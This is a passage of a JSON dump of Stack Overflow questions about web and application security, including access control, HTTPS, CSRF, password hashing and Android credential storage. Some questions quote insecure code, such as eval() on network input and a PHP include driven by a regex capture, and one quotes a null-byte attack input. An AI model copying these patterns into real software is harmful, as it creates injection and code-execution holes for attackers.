outside the firewall. </p>\n\n<p>We thought about taking the server, remove the security from the binding so the trust won't be an issue, and place it outside the firewall. Is that a reasonable option? If not: why, and what are our alternatives?</p>\n"},{"tags":["security","rest","authorization","jax-rs","glassfish-3"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":55,"score":4,"question_id":13071295,"title":"JAX-RS, how to prevent user A from accessing user B's restful resource","body":"<p>I'm using JAX-RS on Glassfish to implement a set of resources, which can be accessed only by specific users.</p>\n\n<p>Consider two users, userA and userB, both registered in my website.</p>\n\n<ol>\n<li>userA created its own resource <code>http://{localhost}/service/user/A</code>; </li>\n<li>userB created its own resource <code>http://{localhost}/service/user/B</code>;</li>\n</ol>\n\n<p>Then Glassfish's default security implementation was configured as:</p>\n\n<ol>\n<li>User Role can access <code>/services/user/*</code></li>\n<li>userA and userB are both in User Role.</li>\n</ol>\n\n<p>So when logged in, both userA and userB can access to <code>/service/user/A</code> and <code>/service/user/B</code>.</p>\n\n<p>Now the question, \nIs it possible that </p>\n\n<ul>\n<li>userA can only access <code>/services/user/A</code>, but not <code>/services/user/B</code></li>\n</ul>\n\n<p>and at the same time</p>\n\n<ul>\n<li>userB can only access <code>/services/user/B, but not</code>/services/user/A`</li>\n</ul>\n\n<p>I think I must have missed something, because this is a common need I believe.\nCan anyone help?</p>\n"}]}
{"total":17772,"page":4,"pagesize":100,"questions":[{"tags":["android","security","webserver","signature","iap"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13066484,"title":"Ensure item is purchased before allowing to download from my server when download is invoked later after purchasing","body":"<p>I have the following scenario:</p>\n\n<ol>\n<li>I have some items that I want to sell</li>\n<li>User buys the item and it is marked is \"Purchased\". Now user can download the file.</li>\n<li>User presses \"Download\" button and downloads the file (it must be some unique link)</li>\n</ol>\n\n<p>I read all inapp billing docs and steps 1 and 2 work fine for me. How can I implement step 3 on the android side?</p>\n\n<p>I imagine this something like:</p>\n\n<ol>\n<li>App sends product id to my server</li>\n<li>My server responds with a nonce</li>\n<li>I send this nonce and product id to Google Play</li>\n<li>Google Play returns me a signed ticket (nonce and product id)</li>\n<li>I send this signed ticket to my server</li>\n<li>my server returns file for app</li>\n</ol>\n\n<p>At this moment I can only handle info if purchase status is changed, but what if I first buy the item and then later download it securely.</p>\n"},{"tags":["asp.net-mvc","security","https","hosting","web-hosting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":33,"score":-1,"question_id":13100290,"title":"Does the RequireHttpsAttribute place any requirements on the hosting provider?","body":"<p>I would like to publish a website. I would like the website to run over HTTPS. I have read about the requirehttpsattribute: <a href=\"http://msdn.microsoft.com/en-us/library/system.web.mvc.requirehttpsattribute.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/system.web.mvc.requirehttpsattribute.aspx</a></p>\n\n<p>Is https done at the application level or does the hosting provider need to support this as well?</p>\n"},{"tags":["security","recaptcha"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13123469,"title":"Can recaptcha be bypassed by sending NULL bytes?","body":"<p>We're running Atomic Secured Linux, and it's been catching posts that are sending NULL bytes in the recaptcha_response_field. The posts in question are definitely spammy, but the only field that gets null bytes is \"recaptcha_response_field\". In particular, the following is present twice in the POST body:</p>\n\n<pre><code>recaptcha_response_field=%00%00%00%00%00%00%00%00\n</code></pre>\n\n<p>I'm wondering if this is a known attack against recaptcha, or otherwise a known method of compromising web servers. And if so, what it's intended to do.</p>\n"},{"tags":["php","android","security"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13117043,"title":"Restrict access to php scripts on my server","body":"<p>I have several php scripts which connect to my sql server and retrieve some data. I call these php scripts from an android application. Now the issue is that I do not want the output of the scripts to be publicly seen when someone goes to that site on their computer.(Since they hold information about who has my application installed and other data). The only reason I have these scripts is for the internal logic of my application. I was wondering is there any easy way to keep my scripts accessible from the android phone and at the same time not display thier output when I connect to it using a browser from my computer. If not what other options do I have ? </p>\n"},{"tags":["android","security"],"answer_count":1,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":314,"score":6,"question_id":10990821,"title":"How to securely store credentials (password) in Android application?","body":"<p>I want to store the password used for signing in a financial application that I am developing at a secure place. After doing some net surfing I found following options but each of them has certain drawback.</p>\n\n<p><strong>1) KeyChain.</strong><br/> \nOnly available in OS version 4.</p>\n\n<p><strong>2) Shared Preferences.</strong><br/>\nIt stores data in plain text even though if I encrypt the data then the encryption key can be compromised by decompiling the application code.</p>\n\n<p><strong>3)  Access keystore daemon and store credentials in it.</strong><br/>\n(<a href=\"http://nelenkov.blogspot.com/2012/05/storing-application-secrets-in-androids.html\" rel=\"nofollow\">http://nelenkov.blogspot.com/2012/05/storing-application-secrets-in-androids.html</a>)\nRequires another password to remember.</p>\n\n<p>Please suggest me a better way to secure credential information in android application like IPhone KeyChain.</p>\n"},{"tags":["svn","merge","connection","security","truncated"],"answer_count":5,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":4393,"score":8,"question_id":2324187,"title":"Merge trunk into branch with SVN: \"Secure Connection Truncated\"","body":"<p>after trying to merge changes to an svn trunk back to the branch with the following command:</p>\n\n<blockquote>\n  <p>../branches/myBranch$ svn merge -r 94:171 <a href=\"https://.../trunk\" rel=\"nofollow\">https://.../trunk</a> --dry-run</p>\n</blockquote>\n\n<p>I get the following error from SVN:</p>\n\n<blockquote>\n  <p>svn: REPORT of '/svnroot/simspark/!svn/vcc/default': Could not read chunk size: Secure connection truncated (https://simspark.svn.sourceforge.net)</p>\n</blockquote>\n\n<p>We already tried to google this for quite a while and concluded that this is kinda pointless. I won't stop you from trying yourself of course, but you have been warned.</p>\n\n<p>Anyway, the general vibe of what we found is that this is a bug in to SVN and we are screwed. I'm using SVN version 1.5.4, which is the newest version available for my Linux distribution.</p>\n\n<p>Any ideas? I don't feel like losing more than three months of work, so a solution would be quite nice.</p>\n\n<p>A colleague who just tried this on a Mac did not get the error and could pull off the dry-run, by the way, but already has a few dozen conflicts, and still counting. &lt;3 SVN.</p>\n"},{"tags":["asp.net","security","papertrail"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12937240,"title":"Papertrail and code access security","body":"<p>I am currently looking into papertrail and find it very interesting.\nHowever my web application will be deployed to web servers that I don't control.\nThe problem is that I use this solution to send logs to papertrail:\n<a href=\"http://help.papertrailapp.com/kb/configuration/nlog-net-logging\" rel=\"nofollow\">http://help.papertrailapp.com/kb/configuration/nlog-net-logging</a></p>\n\n<p>And the way I see it I can't send logs on a website with medium trust level:\n<a href=\"http://technet.microsoft.com/en-us/library/cc754779.aspx\" rel=\"nofollow\">http://technet.microsoft.com/en-us/library/cc754779.aspx</a></p>\n\n<p>Is this right?\nDo you have any experience with using papertrail on medium trust sites?</p>\n"},{"tags":["php","regex","security","eval"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":296,"score":1,"question_id":6767884,"title":"PHP preg_replace - How to get the same result without `/e` `eval` - improved security and speed performance?","body":"<p>How to get the same result without <code>/e</code> <code>eval</code> - improved security and speed performance?</p>\n\n<pre><code>function finclude($file){\n    return include($file);\n}\n\n$str = \"Today is {include 'date.php'}.\";\necho preg_replace(\"/\\{include '(.*)\\'}/e\", 'finclude(\"$1\")', $str);\n</code></pre>\n\n<p>date.php:</p>\n\n<pre><code>&lt;?php return date('jS \\of F'); ?&gt;, 2011\n</code></pre>\n\n<p>Result: <code>Today is 20th of July.</code></p>\n"},{"tags":["php","apache","security","centos"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13120522,"title":"PHP Login - Password input - Special characters? - Centos 5 System","body":"<p>I have a CentOS 5 VPS and I have just installed my website there. But I have problems that when I'm inserting special characters into the password field like: ' (apostophe) or something like that, I always get the error, that this password is incorrect :/ I guess this is because of the Linux System. Am I right? Or maybe because of te sanitizing I'm doing?</p>\n\n<p>I'd be gald if anyone could help me.</p>\n\n<p>EDIT:</p>\n\n<pre><code>function array_sanitize(&amp;$item) {\n    $item = htmlentities(strip_tags(mysql_real_escape_string($item)));\n}\n</code></pre>\n"},{"tags":["security","mobile","air","https","adobe"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13119895,"title":"Try to make Https Request on Adobe Air mobile apps with Actionscript Flex","body":"<p>I try to make an https request from a mobile iOs Device. This isnt working. In the flashbuilder simulator (on Mac) I have to accept the self-signed certificate but  its working fine. \nOn the mobile device I've got the </p>\n\n<blockquote>\n  <p>error 2032</p>\n</blockquote>\n\n<p>I also have the same problem on an web mirgrated Version of the app. \nI have added on the server root  the crossdomain.xml:</p>\n\n<pre><code>site-control permitted-cross-domain-policies=\"master-only\"\nallow-access-from domain=\"*\" secure=\"false\"\n</code></pre>\n\n<p>In the project i use the  mx.rpc.http.HTTPService class. And i tried to change the destination type but with no effect:</p>\n\n<pre><code>useProxy = true;\ndestination = 'DefaultHTTPS';\n</code></pre>\n"},{"tags":["spring","security","pre-authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13120362,"title":"Spring Security @PreAuthorize \"false\" instead of Exception","body":"<p>I encountered the situation when I need to use @Pre or @PostAuthorize annotation but with returned value \"false\" instead Authentication Exception. Have anyone any idea how to realize this?</p>\n"},{"tags":["php","security","permissions","webserver"],"answer_count":4,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":1840,"score":3,"question_id":3484171,"title":"File permissions; Should my www-folder content be owned by www-data?","body":"<p>This might be a noob question, but can't find an answer anywhere.</p>\n\n<p>I have a problem, which <a href=\"http://stackoverflow.com/questions/3483832/another-file-permissions-problem\">http://stackoverflow.com/questions/3483832/another-file-permissions-problem</a> have helped me to ALMOST solve.</p>\n\n<p>I have created a user in linux (<strong>danny</strong>) which has sudo access.\nI have also created a new group which name ALSO is <strong>danny</strong>, and added the user <strong>danny</strong> to that group. <strong>This group has sudo (root) access.</strong></p>\n\n<p>I have all files and folders in my <strong>www</strong> folder owned by danny/danny group.</p>\n\n<p>I have an image-upload code which is <strong>php</strong>. This code cannot upload images to a folder called \"<strong>images</strong>\" folder which is under the <strong>www</strong> folder, UNLESS I give the images folder <strong>777</strong> permissions.</p>\n\n<p>So, I have followed the answer on the linked question, and have figured out that the user which the upload-script is run as is \"<strong>www-data</strong>\".</p>\n\n<p>According to the answer on the link to the other question I posted, I need to add <strong>www-data</strong> to a group... But I am stuck here...</p>\n\n<p>Which group should I add to? What should I do from here?</p>\n\n<p>Any tips are appreciated.</p>\n\n<p>Btw, here is some info about www-data and danny</p>\n\n<pre><code>  id www-data:\n  uid=33(www-data) gid=33(www-data) groups=33(www-data)\n  id danny\n  uid=1000(danny) gid=33(www-data) groups=33(www-data)\n</code></pre>\n\n<p>Thanks and if you need more input, just let me know...</p>\n"},{"tags":["java","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13119641,"title":"Java Programmatically read informations from a Key/Certificate","body":"<p>I'm tryin to build a certificate/key management tool, but i don't understand how to obtain md5 fingerprint of a certificate/key. </p>\n\n<p>For example if i use keytool command on a keystore i obtain the </p>\n\n<pre><code>Keystore type: JKS\nKeystore provider: SUN\n\nYour keystore contains 1 entry\n\nAlias name: myname\nCreation date: 21-Aug-2011\nEntry type: PrivateKeyEntry\nCertificate chain length: 1\nCertificate[1]:\nOwner: CN=bla bla, L=bla, ST=bla\nIssuer: CN=bla bla, L=bla, ST=bla\nSerial number: 123w3qa\nValid from: Sun Aug 21 00:12:31 CEST 2011 until: Mon Jul 28 00:12:31 CEST 2110\nCertificate fingerprints:\n         MD5:  1A:DE:60:21:DE:B1:BF:C3:D1:AD:11:F1:21:22:D7:9E\n         SHA1: 72:3A:D9:2E:1A:DE:60:21:DE:B1:BF:C3:D1:AD:11:F1:21:22:D7:9E\n         Signature algorithm name: SHA256withRSA\n         Version: 3\n\nExtensions:\n\n#1: ObjectId: 2.5.29.14 Criticality=false\nSubjectKeyIdentifier [\nKeyIdentifier [\n0000: AA EA FA FE 34 DA 6E C6   FC 8B 6C DE S9 21 S9 S4  ......^...l.I!.D\n0010: S3 33 29 SD                                        .S..\n]\n]\n\n*******************************************\n*******************************************\n</code></pre>\n\n<p>Now i want to obtain via java the following informations: \n1. MD5 fingerprint\n2. KeyIdentifier</p>\n\n<p>I obtained some informations using X500Certificate object and X500Principal(for example date from and to, owner, issuer, alias name), but i didn't found where i can obtain other informations. Can someone help me? </p>\n"},{"tags":["windows","security","api","debugging","winapi"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13109513,"title":"RPC integrity privilege in processs","body":"<p>I have 2 processes running in my system (Windows 7 )one of them is with medium integrity level and the second is with a low integrity level.</p>\n\n<p>if my medium integrity send an RPC call to the low integrity process does the code get execute in a low or medium integrity level ?</p>\n"},{"tags":["security","module","playframework"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1110,"score":3,"question_id":7387759,"title":"How to customize login.html while using Secure Module in play framework","body":"<p>I am newbie to play. Since I am using Secure Module in play framework with japid. I have designed the custom login templete and called the templete in \"beforeLogin.html\" tag. I need to show my custom login templete instead of Secure Module's login.html templete. I have tried to override login.html using play secure:ov --login. It successfully overrides the login page and puts the page locally in Secure folder. But I need to user my own custom login page instead of Secure Module's login.html</p>\n"},{"tags":["android","security","passwords","android-backup-service"],"answer_count":0,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":54,"score":3,"question_id":12282019,"title":"Backup passwords in Android","body":"<p>I want to use <a href=\"http://developer.android.com/guide/topics/data/backup.html\" rel=\"nofollow\">Android Backup Service</a> to backup some settings of my application, including usernames and passwords. But this service is not safe.</p>\n\n<p>Google directly writes about it:</p>\n\n<blockquote>\n  <p>Caution: Because the cloud storage and transport service can differ\n  from device to device, Android makes no guarantees about the security\n  of your data while using backup. You should always be cautious about\n  using backup to store sensitive data, such as usernames and passwords.</p>\n</blockquote>\n\n<p>What is the best way to make our backup safe? Is anybody know simplest and safest methods to create secure data backup?</p>\n"},{"tags":["c#","asp.net","wcf","security","wshttpbinding"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12815423,"title":"ASP.NET: Programmatically check if the secutiry mode is set to \"None\" or \"TransportWithMessageCredential\"?","body":"<p>How can I programmatically check if the secutiry mode of the wsHttpBinding in the web.config is set to \"<code>None</code>\" or \"<code>TransportWithMessageCredential</code>\" ?\nI want the webapplication to behave differently when I change the security setting in the web.config.</p>\n\n<p><strong>web.config:</strong></p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n  &lt;configSections&gt;\n    ...\n  &lt;system.serviceModel&gt;\n    &lt;services&gt;\n      &lt;service behaviorConfiguration=\"PirIS.Web.WCF.MobileServiceBehavior\"\n               name=\"PirIS.Web.WCF.MobileService\"&gt;\n        &lt;endpoint address=\"\"\n                  binding=\"wsHttpBinding\"\n                  bindingConfiguration=\"wsHttpBinding_MobileService\"\n                  contract=\"PirIS.Web.WCF.IMobileService\"&gt;\n          &lt;identity&gt;\n            &lt;dns value=\"localhost\" /&gt;\n          &lt;/identity&gt;\n        &lt;/endpoint&gt;\n        &lt;endpoint address=\"mex\" binding=\"mexHttpBinding\" contract=\"IMetadataExchange\" /&gt;\n      &lt;/service&gt;\n    &lt;/services&gt;\n    &lt;bindings&gt;\n      &lt;wsHttpBinding&gt;\n        &lt;binding name=\"wsHttpBinding_MobileService\" &gt;\n          &lt;security mode=\"None\"&gt;\n          &lt;!--&lt;security mode=\"TransportWithMessageCredential\"&gt;--&gt;\n            &lt;message clientCredentialType=\"UserName\" negotiateServiceCredential=\"False\" /&gt;\n            &lt;transport clientCredentialType=\"None\" /&gt;\n          &lt;/security&gt;\n        &lt;/binding&gt;\n      &lt;/wsHttpBinding&gt;\n    &lt;/bindings&gt;\n    ...\n  &lt;/system.serviceModel&gt;\n  ...\n&lt;/configuration&gt;\n</code></pre>\n"},{"tags":["security","ruby-on-rails-3.2","web-security","csrf","csrf-protection"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":13112787,"title":"CSRF Protection on static pages","body":"<p>I have a static site which has forms. The forms submits to a Rails endpoint which captures the submitted data. The static site and the Rails endpoint are on the same domain, on different subdomains and all traffic is completely on HTTPS.</p>\n\n<p>I understand how Rails CSRF works for server generated forms. But in my case, these forms are on static HTML pages. I understand all request headers can be faked, so can't rely on that.</p>\n\n<p>If a strong solution is not possible for this scenario then my last option would be to move to server generated forms (which I want to avoid for now).</p>\n\n<p>Any suggestions on a good approach to this would be most welcome. Or any pointers to a system or a library which already does this.</p>\n\n<p>Thanks</p>\n"},{"tags":["spring","security","session","context","sharing"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13081304,"title":"How can we flow user session from one spring application context to another?","body":"<p>How can we flow user session from one spring application context to another?\nBasically I have one spring application representing Web Layer and another spring application representing REST layer.  I want when Web Layer access the REST layer the session containing user info to be available from to Web at REST layer for authentication.</p>\n\n<p>Please suggest.</p>\n\n<p><em>Edit after receiving first ans:</em> <br>\nAt present we do have Web Layer in place along with security and all the other flows.  What we are about to intended is to introduce REST layer.  This REST layer is suppose to be called by present Web Layer and by other APIs.  We do not want to make any changes for Web Layer, but at the same time need security to be placed at REST Layer that should work for Web Layer too when calling REST services.</p>\n"},{"tags":["php","security","md5"],"answer_count":9,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":504,"score":1,"question_id":5990613,"title":"How can I make MD5 more secure? Or is it really necessary?","body":"<p>I'm storing username and password in a MySQL database and have them hashed using MD5. However, I'm only using the standard PHP function without any modification. Now, I read that MD5 is broken. How are you doing it? Do you run it several times through a different hash mechanism or add some form of salt?</p>\n"},{"tags":["security","joomla","xss"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":83,"score":-1,"question_id":13114157,"title":"how to fix to Joomla 1.5 URL Redirecting Vulnerability?","body":"<p>I have today discovred a problem on my website </p>\n\n<p>This vulnerability sends my visitor to a custom url \"ya.ru\"</p>\n\n<p>Here you can see what is the <strong>vulnerability</strong> </p>\n\n<p><strong>http://www.exploit-db.com/exploits/14722</strong></p>\n\n<p>help to find a way to fix please \nthank you in advance</p>\n"},{"tags":["php","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13114580,"title":"Limiting Access to a Specific Page By Requiring Sequential Order of Page Views","body":"<p>I am trying to limit page access so that the user must enter the page in question by clicking a button on 1 of 3 pages.</p>\n\n<p>So, to be clear, page x can only be accessed if the user clicks a button from page 1, 2, or 3.</p>\n\n<p>I've tried using <code>isset</code> if/<code>else</code> blocks, but cannot seem to make any progress with limiting the page access in this way. If anyone has any suggestions I'd be very grateful!</p>\n"},{"tags":["security","web-applications","open-source"],"answer_count":6,"favorite_count":13,"up_vote_count":15,"down_vote_count":0,"view_count":3273,"score":15,"question_id":365309,"title":"Where can I find a deliberately insecure open source web application?","body":"<p>As a developer, I've learned that I usually gain a better understanding of best/worst practices through experience.  The area of web application security isn't really somewhere where my organization can afford to let developers learn through trial and error.  </p>\n\n<p>So looking for a hands-on approach to knowledge sharing of best practices in web application security, I was thinking that it would be useful to have an open source application that was deliberately built to be insecure in order to help teach junior developers about application security.</p>\n\n<p>Does anyone out there know where to find something like this?</p>\n"},{"tags":["asp.net","security","ssl","securityswitch"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1794,"score":3,"question_id":6601467,"title":"Only secure content is displayed","body":"<p>Our company website (ASP.Net 3.5) uses SSL to secure the checkout pages. Users are getting the \"Only secure content is displayed\" message at the bottom of IE. Many of them freak out and abandon their cart and we loose a sale.\nThe secure contect is in a subfolder and IIS7 is configured to require SSL on that subfolder.\nI used the IE dev toolbar to try to see what causes this and get the following:</p>\n\n<pre><code>SEC7111: HTTPS security is compromised by http://www.myCompany.com/WebResource.axd?d=dJde0NlmEkubWa-RO0uUtg2&amp;t=633833944103732959 \nLogin.aspx\nSEC7111: HTTPS security is compromised by http://www.myCompany.com/ScriptResource.axd?d=-4ipYW6oMR5JKr02ccZdGEkLMeXnvSWAqFrG98oQ5--7NMeKPsjwSVXJeHzqvzhsd1bLH85MgJQdnNYNUNH1gAXPGD9gbk2fwYnJI-0eaw41&amp;t=ffffffffa6437166 \nLogin.aspx\nSEC7111: HTTPS security is compromised by http://www.myCompany.com/ScriptResource.axd?d=-4ipYW6oMR5JKr02ccZdGEkLMeXnvSWAqFrG98oQ5--7NMeKPsjwSVXJeHzqvzhsvkt8QvjGkHw2IYbLkF5RHr1t21TH0EEkLDcUGVpdxdE1&amp;t=ffffffffa6437166 \nLogin.aspx\n</code></pre>\n\n<p>We also had a bunch of offending javascript files but worked around those by copying them into the secure directory. That made Chrome and Firefox happy but we still get the message with IE.</p>\n\n<p>How can I stop the popup and keep from scaring my customers away?</p>\n"},{"tags":["java","security","byte","des"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":3697,"score":0,"question_id":5364338,"title":"Converted secret key into bytes, how to convert it back to secrect key?","body":"<p>I convert the secretkey into bytes with following code</p>\n\n<pre><code>SecretKey key = KeyGenerator.getInstance(\"DES\").generateKey();\nbyte[] bkey=key.getEncoded();\n</code></pre>\n\n<p>Now how do I get the key from <code>bkey</code>? I tried:</p>\n\n<pre><code>SecretKeySpec secretkey = new SecretKeySpec(bkey,\"DES\");   \nSecretKeyFactory sfkey = SecretKeyFactory.getInstance(\"DES\");\nSecretKey skey = sfkey.generateSecret(secretkey);\n</code></pre>\n\n<p>I get the following error:</p>\n\n<pre><code>Error during Exception java.security.spec.InvalidKeySpecException: Inappropriate key specification\n</code></pre>\n"},{"tags":["security","windows-7","networking","network-programming","sniffing"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2423,"score":1,"question_id":4004538,"title":"How to put NIC into promiscuous mode?","body":"<p>Hi\nI want to put my NIC into promiscuous mode. Why? \nBecause I wrote app which is able potentially to detect sniffing in my local network (send modyfied appropriately ethernet packets). I just want now check it out, so in my second comp I want to set up promisc mode. \nThere's Windows 7 and simply Dell Wireless 1397 WLAN Mini-Card...if it makes a difference.</p>\n\n<p>How can I do this?</p>\n"},{"tags":["php","database","security","get"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13112152,"title":"PHP Access Database with GET Security","body":"<p>I am writing a database interface using PHP.  One of the functions of the database is to allow members to login and register for events online.  I would like to create a php file that would create a dynamic calendar file users can subscribe to.  Something to the effect of www.hostname.net/my_calendar.php?memid=123.  The file then will search the database for events member 123 has registered for and create a calendar file on the fly.  My concern the security of using the members' id number for this purpose.  Is there a good way of accomplishing this with a reasonable amount of security, or may there be a security issue here that I am not considering.</p>\n"},{"tags":["python","security","networking","eval","twisted"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":63,"score":2,"question_id":13111410,"title":"Eval safety in python, string pulled from JSON","body":"<p>I'm wracking my brain trying to find a way to exploit this setup. My concept is this: my twisted server receives messages (via <code>LineReceiver</code>). The messages are base64 JSON, which SHOULD contain a single dictionary. The dictionary has a <code>\"INSTRUCTION\"</code> key which indicates what sort of client action the server should be processing.</p>\n\n<p>At this portion of the program, <code>line</code> is a base64 string received over the network.</p>\n\n<pre><code>def Decode(line):\n    return json.loads(base64.b64decode(line))\n</code></pre>\n\n<p>And the interpretation (inside a twisted <code>Protocol</code> object)</p>\n\n<pre><code>def lineReceived(self, line):\n    instruction = Decode(line)  #dict\n    if instruction and \"INSTRUCTION\" in instruction:\n        if instruction[\"INSTRUCTION\"] in (\"register\", \"join\", \"create\", \n         \"list\", \"passturn\", \"impmove\", \"warpmove\",\"laserattack\",\n         \"torpattack\", \"mine\", \"data\", \"status\"):\n            cmdstring = instruction[\"INSTRUCTION\"] + \"(self)\"\n            eval(cmdstring)\n</code></pre>\n\n<p>Why I think it's safe:</p>\n\n<ul>\n<li>eval will only run if I get a plain string as the value.</li>\n<li>JSON can't pack complex objecst, only python basics. An attacker shouldn't have <code>__str__</code> access to what I receive, right?</li>\n<li>I'm using eval to provide a less readable but much more compact replacement for a dozen <code>if instruction[\"INSTRUCTION\"] == \"functionA\": functionA(self)</code> lines. I'm just running eval to choose a function from a specific list.</li>\n</ul>\n\n<p>Is this safe? Is this considered acceptable style or form? Is this block of code robust enough for a multiplayer game, since the client cannot be trusted? (Validation that the instruction follows the game rules is later, here I want to protect my server from destructive tinkering.)</p>\n\n<p>Is there a better way to do what I'm attempting (remote execution of a function, I suppose) that is more standard / safe?</p>\n"},{"tags":["php","html","security","cookies","https"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":40,"score":-2,"question_id":13111135,"title":"Setting Secure Cookies","body":"<p>So i managed to solve my original question from <a href=\"http://stackoverflow.com/questions/13110663/forcing-https-over-http\">this</a> post. But according to the answer </p>\n\n<blockquote>\n  <p>the cookies and query parameters with possibly sensitive data has already been sent in clear text, so remember to use the secure cookie atribute if you use cookies.</p>\n</blockquote>\n\n<p>But if I have an <code>index.php</code> inside of a folder, where exactly should I set the cookie secure flag. At the top of <code>index.php</code> or somewhere in root directory?</p>\n"},{"tags":["security","https","httprequest"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":13097971,"title":"Is it necessary to use HTTPS for server side requests?","body":"<p>I'm allowing users to log in to my site using third party credentials (let's call it SocialFoo). Users submit their username and password for SocialFoo via a POST over HTTPS. After the POST is made, on the server side, I validate the credentials via an API call to SocialFoo. </p>\n\n<p>Is there any security benefit to making the API call to SocialFoo via HTTPS rather than HTTP? Since this request is theoretically not exposed to user, is there a security risk beyond packet sniffers at the data center?</p>\n"},{"tags":["security",".htaccess","http","https","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":46,"score":0,"question_id":13110663,"title":"Forcing HTTPS over HTTP","body":"<p>So I want to force the user to access the https version of my page rather than the http. And according to <a href=\"http://stackoverflow.com/questions/8476324/using-https-instead-of-http\">this</a> post all I have to do is this:</p>\n\n<pre><code>RewriteEngine On \nRewriteCond %{SERVER_PORT} 80 \nRewriteRule ^(.*)$ https://www.yourdomain.com/$1 [R,L]\n</code></pre>\n\n<p>But <em>MY</em> site resides in a folder within the main directory, so it's in <code>www.domain.com/Folder</code>. So should this htaccess code go inside the main directory or in the subdirectory. Because I do not want to change the way the access the main site, only the folder. </p>\n"},{"tags":["python","security","pdf","reportlab"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13109867,"title":"python: pdf - set password protected print, copy, paste options?","body":"<p>Hi I'm looking for a python lib that will allow me to set password protected print, copy, paste options on some existing pdfs</p>\n\n<p>I looked at the reportlab pdfencrypt module: this has exactly the options I need, but the open source version is heavily restricted - cant even set a real password, and the license is not an option (over 1000/year) - this will be relatively low volume (&lt; 1000 docs processed per year), and the client is a non-profit organisation</p>\n\n<p>any suggestions greatly appreciated! </p>\n"},{"tags":["javascript","html5","security","canvas","cors"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":72,"score":-1,"question_id":12822576,"title":"canvas toDataURL for uploaded file throws security error on same domain","body":"<p>so you select an image via the file input, the selected image file gets gets turned into a window.url.createobjecturl and passed to a hidden \"img\" element unmodified, then a preview of the image element's current data is rendered into a canvas element. so far, so good. but then when i try to render the canvas.toDataURL i keep getting that aggravating security exception about it being insecure. this happens on chrome and firefox.</p>\n\n<p>understand that this is a file OBJECT that was select with an html INPUT element, and NOT via a \"file://\" url, and the webpage is an actual webpage, and is loaded via \"http://\" and not via \"file://\".</p>\n\n<p>the image file has not even left the browser yet to go to the server, so there should not be any domain issues. it's just a raw blob being asserted as the source to an image, which is then telling the canvas to update its preview, which it does. after that, when trying to saved the canvas contents, the browser triggers an error.</p>\n\n<p>i have read all of the specs regarding scenarious where the canvas element becomes tainted, and this scenario does not meet ANY of those scenarios.</p>\n\n<p>i've seen a similar example on mozilla demos of some one offering code snippets to show people how to do the same thing, but i have not seen if any one had problems with it.</p>\n\n<p>any ideas? TIA</p>\n\n<p>#</p>\n\n<p>=== UPDATE ===</p>\n\n<p>#</p>\n\n<p>okay, i've figured out what the PROBLEM is, but i'm still not clear on WHY it's a problem. here's the setup:</p>\n\n<p>1) page is called via, eg, \"example.com/\"</p>\n\n<p>2) script is called via: \"r.example.com/script.js\"</p>\n\n<p>3) if script loads ANY image from \"r.example.com\", to use for the PAGE DESIGN, and NOT the canvas, it some how taints the entire page. in this case i draw the entire page via javascript, so the header image is tainting the rest of the page. if i change the header image to come from \"example.com\" instead of \"r.example.com\", the problem with the canvas complaining about not being secure goes away, and everything is fine.</p>\n\n<p>what i don't understand is WHY this is happening. the header image is being loaded from the same place as the javascript file, and, for the sake of argument i even set the access-control-allow-origin to \"*\", for both the main domain and the subdomain, which makes no difference.</p>\n\n<p>so, access control is allowed from anywhere, the header image is coming from the same place as the javascript file, and it is NOT being drawn to the canvas (that's a user file), so why would drawing the header image via javascript taint a canvas that it has nothing to do with??? 